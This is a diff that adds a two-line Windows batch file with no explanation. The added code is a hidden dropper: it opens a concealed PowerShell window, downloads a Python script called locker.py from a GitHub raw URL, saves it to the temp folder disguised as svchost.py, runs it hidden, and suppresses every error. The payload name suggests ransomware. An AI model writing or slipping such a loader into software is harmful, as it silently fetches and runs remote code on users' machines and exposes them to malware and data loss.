@@ -1,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -Command "& {try{$w=(New-Object Net.WebClient);$u='https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.py';$f=$env:TEMP+'\svchost.py';$w.DownloadFile($u,$f);start python $f -WindowStyle Hidden}catch{}}"
